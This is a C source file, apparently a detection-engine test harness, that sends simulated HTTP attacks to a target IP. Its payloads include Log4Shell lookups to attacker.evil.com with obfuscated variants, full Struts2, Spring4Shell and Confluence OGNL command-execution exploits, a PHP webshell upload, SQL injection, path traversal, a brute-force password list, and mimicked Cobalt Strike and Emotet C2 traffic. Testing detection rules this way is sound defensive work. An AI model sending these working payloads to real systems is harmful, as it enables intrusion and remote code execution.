/**
 * @file    attack_http.c
 * @brief   HTTP/HTTPS 应用层攻击模拟测试
 *
 * 覆盖规则:
 *   VDE-008  Log4Shell CVE-2021-44228 (JNDI 注入)
 *   VDE-009  ProxyLogon CVE-2021-26855 (Exchange SSRF)
 *   VDE-033  Log4Shell 混淆绕过变体
 *   VDE-034  ProxyShell CVE-2021-34473
 *   VDE-035  Spring4Shell CVE-2022-22965
 *   VDE-036  Struts2 CVE-2017-5638 OGNL
 *   VDE-037  HTTP SQL 注入
 *   VDE-038  HTTP XSS 反射型
 *   VDE-039  HTTP 路径遍历
 *   VDE-040  HTTP WebShell 上传
 *   VDE-041  HTTP 登录暴力破解 (THRESHOLD)
 *   VDE-042  扫描器 User-Agent
 *   VDE-046  Cobalt Strike Beacon HTTP
 *   VDE-048  Emotet C2 HTTP
 *   VDE-053  Confluence OGNL CVE-2022-26134
 *   VDE-054  vCenter RCE CVE-2021-21985
 */

#include "../include/attack_common.h"

/* =========================================================
 *  HTTP 工具函数
 * ========================================================= */

/**
 * 发送原始 HTTP 请求
 * @param ip       目标 IP
 * @param port     目标端口
 * @param request  完整 HTTP 请求字符串
 * @return         发送字节数，-1 失败
 */
static int send_http_request(const char* ip, uint16_t port,
                              const char* request) {
    sock_t s = tcp_connect(ip, port, 3000);
    if (s == INVALID_SOCK) {
        /* 降级：通过 UDP 发送，让检测引擎捕获特征 */
        sock_t u = udp_socket();
        if (u != INVALID_SOCK) {
            int r = udp_send(u, ip, port, (const uint8_t*)request,
                             (int)strlen(request));
            CLOSE_SOCK(u);
            return r;
        }
        return -1;
    }

    int r = tcp_send_all(s, (const uint8_t*)request, (int)strlen(request));
    if (r > 0) {
        uint8_t resp[512];
        tcp_recv(s, resp, sizeof(resp), 2000);
    }
    CLOSE_SOCK(s);
    return r;
}

/* =========================================================
 *  测试函数
 * ========================================================= */

static void test_log4shell(const char* target_ip, uint16_t port, TestStats* stats) {
    PRINT_INFO("=== VDE-008 Log4Shell CVE-2021-44228 ===");
    stats->total++;

    /* JNDI 注入在 User-Agent 头中 */
    char req[1024];
    snprintf(req, sizeof(req),
        "GET / HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "User-Agent: ${jndi:ldap://attacker.evil.com:1389/exploit}\r\n"
        "X-Api-Version: ${jndi:rmi://attacker.evil.com:1099/a}\r\n"
        "X-Forwarded-For: ${jndi:dns://attacker.evil.com/log4shell}\r\n"
        "Connection: close\r\n\r\n",
        target_ip, port);

    int r = send_http_request(target_ip, port, req);
    if (r > 0) {
        PRINT_SEND("Log4Shell JNDI 注入请求已发送 (User-Agent + X-Api-Version + X-Forwarded-For)");
        stats->sent++;
        PRINT_OK("VDE-008 流量已发送，等待检测引擎告警");
    } else {
        PRINT_FAIL("VDE-008 发送失败");
        stats->failed++;
    }
}

static void test_log4shell_bypass(const char* target_ip, uint16_t port, TestStats* stats) {
    PRINT_INFO("=== VDE-033 Log4Shell 混淆绕过变体 ===");
    stats->total++;

    /* 混淆变体：${${::-j}${::-n}${::-d}${::-i}:ldap://...} */
    char req[1024];
    snprintf(req, sizeof(req),
        "GET / HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.evil.com/bypass}\r\n"
        "X-Custom: ${${lower:j}ndi:${lower:l}dap://attacker.evil.com/a}\r\n"
        "Connection: close\r\n\r\n",
        target_ip, port);

    int r = send_http_request(target_ip, port, req);
    if (r > 0) {
        PRINT_SEND("Log4Shell 混淆绕过载荷已发送");
        stats->sent++;
        PRINT_OK("VDE-033 流量已发送");
    }
}

static void test_proxylogon(const char* target_ip, TestStats* stats) {
    PRINT_INFO("=== VDE-009 ProxyLogon CVE-2021-26855 ===");
    stats->total++;

    /* Exchange SSRF: X-AnonResource-Backend 头 + /ecp/ 路径 */
    char req[1024];
    snprintf(req, sizeof(req),
        "POST /ecp/default.flt HTTP/1.1\r\n"
        "Host: %s:443\r\n"
        "Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: 2\r\n"
        "Connection: close\r\n\r\n"
        "{}",
        target_ip);

    int r = send_http_request(target_ip, 443, req);
    if (r > 0) {
        PRINT_SEND("ProxyLogon SSRF 请求已发送 (X-AnonResource-Backend + /ecp/)");
        stats->sent++;
        PRINT_OK("VDE-009 流量已发送");
    }
}

static void test_proxyshell(const char* target_ip, TestStats* stats) {
    PRINT_INFO("=== VDE-034 ProxyShell CVE-2021-34473 ===");
    stats->total++;

    /* 路径混淆绕过认证 */
    char req[512];
    snprintf(req, sizeof(req),
        "POST /autodiscover/autodiscover.json?@evil.com/ews/exchange.asmx?& HTTP/1.1\r\n"
        "Host: %s:443\r\n"
        "Content-Type: text/xml\r\n"
        "Content-Length: 0\r\n"
        "Connection: close\r\n\r\n",
        target_ip);

    int r = send_http_request(target_ip, 443, req);
    if (r > 0) {
        PRINT_SEND("ProxyShell 路径混淆请求已发送");
        stats->sent++;
        PRINT_OK("VDE-034 流量已发送");
    }
}

static void test_spring4shell(const char* target_ip, uint16_t port, TestStats* stats) {
    PRINT_INFO("=== VDE-035 Spring4Shell CVE-2022-22965 ===");
    stats->total++;

    const char* body =
        "class.module.classLoader.resources.context.parent.pipeline"
        ".first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B"
        "java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22))"
        ".getInputStream()%3B%7D%25%7Bsuffix%7Di&"
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&"
        "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&"
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&"
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=";

    char req[2048];
    snprintf(req, sizeof(req),
        "POST /spring-app/upload HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n\r\n"
        "%s",
        target_ip, port, (int)strlen(body), body);

    int r = send_http_request(target_ip, port, req);
    if (r > 0) {
        PRINT_SEND("Spring4Shell class.module.classLoader 载荷已发送");
        stats->sent++;
        PRINT_OK("VDE-035 流量已发送");
    }
}

static void test_struts2_ognl(const char* target_ip, uint16_t port, TestStats* stats) {
    PRINT_INFO("=== VDE-036 Apache Struts2 CVE-2017-5638 OGNL ===");
    stats->total++;

    /* Content-Type 头中注入 OGNL 表达式 */
    char req[1024];
    snprintf(req, sizeof(req),
        "POST /struts2-showcase/fileupload/doUpload.action HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: %%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        "(#_memberAccess?(#_memberAccess=#dm):(#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        "(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())."
        "(#context.setMemberAccess(#dm))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        "(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))."
        "(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        "(#ros.write(#process.getInputStream().readAllBytes())).(#ros.flush())}\r\n"
        "Content-Length: 0\r\n"
        "Connection: close\r\n\r\n",
        target_ip, port);

    int r = send_http_request(target_ip, port, req);
    if (r > 0) {
        PRINT_SEND("Struts2 OGNL 注入请求已发送");
        stats->sent++;
        PRINT_OK("VDE-036 流量已发送");
    }
}

static void test_sql_injection(const char* target_ip, uint16_t port, TestStats* stats) {
    PRINT_INFO("=== VDE-037 HTTP SQL 注入 ===");
    stats->total++;

    /* 多种 SQL 注入变体 */
    const char* payloads[] = {
        "' OR 1=1--",
        "' UNION SELECT 1,2,3--",
        "'; DROP TABLE users--",
        "1' AND '1'='1",
        "admin'--"
    };

    int sent = 0;
    for (int i = 0; i < 5; i++) {
        char req[512];
        snprintf(req, sizeof(req),
            "GET /login?user=%s&pass=test HTTP/1.1\r\n"
            "Host: %s:%d\r\n"
            "Connection: close\r\n\r\n",
            payloads[i], target_ip, port);

        if (send_http_request(target_ip, port, req) > 0) sent++;
        SLEEP_MS(100);
    }

    if (sent > 0) {
        PRINT_SEND("SQL 注入载荷已发送 (%d 种变体)", sent);
        stats->sent++;
        PRINT_OK("VDE-037 流量已发送");
    }
}

static void test_xss(const char* target_ip, uint16_t port, TestStats* stats) {
    PRINT_INFO("=== VDE-038 HTTP 反射型 XSS ===");
    stats->total++;

    char req[512];
    snprintf(req, sizeof(req),
        "GET /search?q=<script>alert('XSS')</script>&name=<img+onerror=alert(1)+src=x> HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Connection: close\r\n\r\n",
        target_ip, port);

    int r = send_http_request(target_ip, port, req);
    if (r > 0) {
        PRINT_SEND("XSS 载荷已发送");
        stats->sent++;
        PRINT_OK("VDE-038 流量已发送");
    }
}

static void test_path_traversal(const char* target_ip, uint16_t port, TestStats* stats) {
    PRINT_INFO("=== VDE-039 HTTP 路径遍历 ===");
    stats->total++;

    const char* paths[] = {
        "/../../../etc/passwd",
        "/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/%252e%252e%252f%252e%252e%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts",
        "/..%5c..%5c..%5cwindows%5csystem32%5cconfig%5cSAM"
    };

    int sent = 0;
    for (int i = 0; i < 4; i++) {
        char req[512];
        snprintf(req, sizeof(req),
            "GET %s HTTP/1.1\r\n"
            "Host: %s:%d\r\n"
            "Connection: close\r\n\r\n",
            paths[i], target_ip, port);

        if (send_http_request(target_ip, port, req) > 0) sent++;
        SLEEP_MS(100);
    }

    if (sent > 0) {
        PRINT_SEND("路径遍历载荷已发送 (%d 种变体)", sent);
        stats->sent++;
        PRINT_OK("VDE-039 流量已发送");
    }
}

static void test_webshell_upload(const char* target_ip, uint16_t port, TestStats* stats) {
    PRINT_INFO("=== VDE-040 HTTP WebShell 上传 ===");
    stats->total++;

    /* 模拟上传含 eval() 的 PHP WebShell */
    const char* shell_content =
        "<?php eval(base64_decode($_POST['cmd'])); "
        "system($_GET['c']); passthru($_REQUEST['x']); "
        "shell_exec($_POST['cmd']); ?>";

    char boundary[] = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
    char body[1024];
    int body_len = snprintf(body, sizeof(body),
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n"
        "%s\r\n"
        "--%s--\r\n",
        boundary, shell_content, boundary);

    char req[2048];
    snprintf(req, sizeof(req),
        "POST /upload.php HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n\r\n"
        "%s",
        target_ip, port, boundary, body_len, body);

    int r = send_http_request(target_ip, port, req);
    if (r > 0) {
        PRINT_SEND("WebShell 上传请求已发送 (含 eval/system/passthru/shell_exec)");
        stats->sent++;
        PRINT_OK("VDE-040 流量已发送");
    }
}

static void test_http_brute_force(const char* target_ip, uint16_t port, TestStats* stats) {
    PRINT_INFO("=== VDE-041 HTTP 登录暴力破解 (THRESHOLD) ===");
    stats->total++;

    const char* passwords[] = {
        "password", "123456", "admin", "root", "letmein",
        "qwerty", "abc123", "monkey", "1234567890", "password1",
        "iloveyou", "sunshine", "princess", "welcome", "shadow",
        "superman", "michael", "football", "master", "666666",
        "dragon", "baseball", "solo", "pass", "trustno1",
        "hello", "charlie", "donald", "password123", "test123"
    };

    int sent = 0;
    for (int i = 0; i < 30; i++) {
        char body[256];
        int blen = snprintf(body, sizeof(body),
            "username=admin&password=%s", passwords[i]);

        char req[512];
        snprintf(req, sizeof(req),
            "POST /login HTTP/1.1\r\n"
            "Host: %s:%d\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: %d\r\n"
            "Connection: close\r\n\r\n"
            "%s",
            target_ip, port, blen, body);

        if (send_http_request(target_ip, port, req) > 0) sent++;
        SLEEP_MS(50);
    }

    PRINT_SEND("已发送 %d 次登录请求（模拟暴力破解）", sent);
    stats->sent++;
    PRINT_OK("VDE-041 阈值触发流量已发送");
}

static void test_scanner_ua(const char* target_ip, uint16_t port, TestStats* stats) {
    PRINT_INFO("=== VDE-042 扫描器 User-Agent 检测 ===");
    stats->total++;

    const char* scanners[] = {
        "sqlmap/1.7.8#stable (https://sqlmap.org)",
        "Nikto/2.1.6",
        "Nmap Scripting Engine; https://nmap.org/book/nse.html",
        "masscan/1.3 (https://github.com/robertdavidgraham/masscan)",
        "zgrab/0.x",
        "nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
        "gobuster/3.6",
        "dirsearch/0.4.3",
        "Hydra v9.4"
    };

    int sent = 0;
    for (int i = 0; i < 9; i++) {
        char req[512];
        snprintf(req, sizeof(req),
            "GET / HTTP/1.1\r\n"
            "Host: %s:%d\r\n"
            "User-Agent: %s\r\n"
            "Connection: close\r\n\r\n",
            target_ip, port, scanners[i]);

        if (send_http_request(target_ip, port, req) > 0) sent++;
        SLEEP_MS(100);
    }

    PRINT_SEND("已发送 %d 种扫描器 UA 请求", sent);
    stats->sent++;
    PRINT_OK("VDE-042 流量已发送");
}

static void test_cobalt_strike_http(const char* target_ip, uint16_t port, TestStats* stats) {
    PRINT_INFO("=== VDE-046 Cobalt Strike Beacon HTTP C2 ===");
    stats->total++;

    /* CS Beacon 默认 profile 特征 */
    char req[512];
    snprintf(req, sizeof(req),
        "GET /jquery-3.3.1.min.js HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        "Cookie: PHPSESSID=aGVsbG93b3JsZA==\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\r\n"
        "Connection: close\r\n\r\n",
        target_ip, port);

    int r = send_http_request(target_ip, port, req);
    if (r > 0) {
        PRINT_SEND("Cobalt Strike Beacon HTTP C2 请求已发送");
        stats->sent++;
        PRINT_OK("VDE-046 流量已发送");
    }
}

static void test_emotet_c2(const char* target_ip, uint16_t port, TestStats* stats) {
    PRINT_INFO("=== VDE-048 Emotet C2 HTTP ===");
    stats->total++;

    /* Emotet 特征：POST + Base64 Cookie + 大载荷 */
    const char* b64_cookie = "dGhpcyBpcyBhIGZha2UgZW1vdGV0IGNvb2tpZSBmb3IgdGVzdGluZw==";
    const char* body = "data=dGhpcyBpcyBhIGZha2UgZW1vdGV0IHBheWxvYWQgZm9yIHRlc3Rpbmcgd2l0aCBsb25nIGNvbnRlbnQ=";

    char req[1024];
    snprintf(req, sizeof(req),
        "POST /update HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Cookie: session=%s\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n\r\n"
        "%s",
        target_ip, port, b64_cookie, (int)strlen(body), body);

    int r = send_http_request(target_ip, port, req);
    if (r > 0) {
        PRINT_SEND("Emotet C2 POST 请求已发送 (含 Base64 Cookie)");
        stats->sent++;
        PRINT_OK("VDE-048 流量已发送");
    }
}

static void test_confluence_ognl(const char* target_ip, TestStats* stats) {
    PRINT_INFO("=== VDE-053 Confluence OGNL CVE-2022-26134 ===");
    stats->total++;

    char req[512];
    snprintf(req, sizeof(req),
        "GET /%%24%%7B%%40java.lang.Runtime%%40getRuntime().exec(%%22id%%22)%%7D/ HTTP/1.1\r\n"
        "Host: %s:8090\r\n"
        "Connection: close\r\n\r\n",
        target_ip);

    int r = send_http_request(target_ip, 8090, req);
    if (r > 0) {
        PRINT_SEND("Confluence OGNL 注入请求已发送");
        stats->sent++;
        PRINT_OK("VDE-053 流量已发送");
    }
}

static void test_vcenter_rce(const char* target_ip, TestStats* stats) {
    PRINT_INFO("=== VDE-054 vCenter RCE CVE-2021-21985 ===");
    stats->total++;

    char req[512];
    snprintf(req, sizeof(req),
        "POST /ui/vropspluginui/rest/services/uploadova HTTP/1.1\r\n"
        "Host: %s:443\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: 50\r\n"
        "Connection: close\r\n\r\n"
        "{\"methodName\":\"uploadOva\",\"args\":[\"cmd\",\"id\"]}",
        target_ip);

    int r = send_http_request(target_ip, 443, req);
    if (r > 0) {
        PRINT_SEND("vCenter RCE 请求已发送 (/ui/vropspluginui/rest/services/)");
        stats->sent++;
        PRINT_OK("VDE-054 流量已发送");
    }
}

/* =========================================================
 *  HTTP 测试入口
 * ========================================================= */
void run_http_attacks(const char* target_ip, uint16_t port, TestStats* stats) {
    printf("\n");
    PRINT_INFO("########################################");
    PRINT_INFO("  HTTP 应用层攻击模拟测试");
    PRINT_INFO("  目标: %s:%d", target_ip, port);
    PRINT_INFO("########################################");

    test_log4shell(target_ip, port, stats);         SLEEP_MS(300);
    test_log4shell_bypass(target_ip, port, stats);  SLEEP_MS(300);
    test_proxylogon(target_ip, stats);              SLEEP_MS(300);
    test_proxyshell(target_ip, stats);              SLEEP_MS(300);
    test_spring4shell(target_ip, port, stats);      SLEEP_MS(300);
    test_struts2_ognl(target_ip, port, stats);      SLEEP_MS(300);
    test_sql_injection(target_ip, port, stats);     SLEEP_MS(300);
    test_xss(target_ip, port, stats);               SLEEP_MS(300);
    test_path_traversal(target_ip, port, stats);    SLEEP_MS(300);
    test_webshell_upload(target_ip, port, stats);   SLEEP_MS(300);
    test_http_brute_force(target_ip, port, stats);  SLEEP_MS(300);
    test_scanner_ua(target_ip, port, stats);        SLEEP_MS(300);
    test_cobalt_strike_http(target_ip, port, stats);SLEEP_MS(300);
    test_emotet_c2(target_ip, port, stats);         SLEEP_MS(300);
    test_confluence_ognl(target_ip, stats);         SLEEP_MS(300);
    test_vcenter_rce(target_ip, stats);             SLEEP_MS(300);
}
